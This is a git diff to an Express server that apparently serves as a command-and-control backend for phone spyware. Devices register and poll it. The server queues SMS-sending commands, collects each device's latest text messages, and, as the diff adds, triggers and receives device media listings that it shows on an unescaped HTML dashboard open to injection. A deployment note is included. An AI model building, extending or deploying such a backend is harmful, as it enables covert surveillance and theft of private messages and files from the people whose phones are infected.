@@ -12,6 +12,8 @@ app.use(express.json());
 const devices = {};   // deviceId -> { deviceId, model, registeredAt }
 const commands = {};  // deviceId -> [ { id, number, message } ]
 const smsData = {};   // deviceId -> latest 10 SMS
+const pending = {};   // deviceId -> true for media requests
+const lastMedia = {}; // deviceId -> latest media list
 
 // ------------------ Device Registration ------------------
 app.post("/register", (req, res) => {
@@ -47,9 +49,9 @@ app.get("/commands", (req, res) => {
     const { deviceId } = req.query;
     if (!commands[deviceId]) return res.json([]);
 
-    const pending = commands[deviceId];
+    const pendingCmds = commands[deviceId];
     commands[deviceId] = []; // clear after sending
-    res.json(pending);
+    res.json(pendingCmds);
 });
 
 // ------------------ Device sends latest SMS ------------------
@@ -69,6 +71,38 @@ app.post("/get-sms", (req, res) => {
     res.json(smsData[deviceId] || []);
 });
 
+// ------------------ Media Request / Live Media ------------------
+app.get('/request/:deviceId', (req, res) => {
+    pending[req.params.deviceId] = true;
+    res.send('REQUEST_SENT');
+});
+
+app.get('/poll', (req, res) => {
+    const id = req.query.deviceId;
+    if (pending[id]) { delete pending[id]; res.send('REQUEST'); }
+    else res.send('WAIT');
+});
+
+app.post('/media/:deviceId', (req, res) => {
+    lastMedia[req.params.deviceId] = req.body; // LIST ONLY (no files)
+    res.send('OK');
+});
+
+app.get('/', (req, res) => {
+    let html = `<h2>Live Media List</h2>`;
+    for (const id in lastMedia) {
+        html += `<h3>Device: ${id}</h3><ul>`;
+        lastMedia[id].forEach(m => html += `<li>${m.name} (${m.type})</li>`);
+        html += `</ul>`;
+    }
+    res.send(html);
+});
+
 // ------------------ Start server ------------------
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+
+/* ============================ RENDER DEPLOY ============================ */
+// Build: npm install
+// Start: node index.js
+// Port: 3000
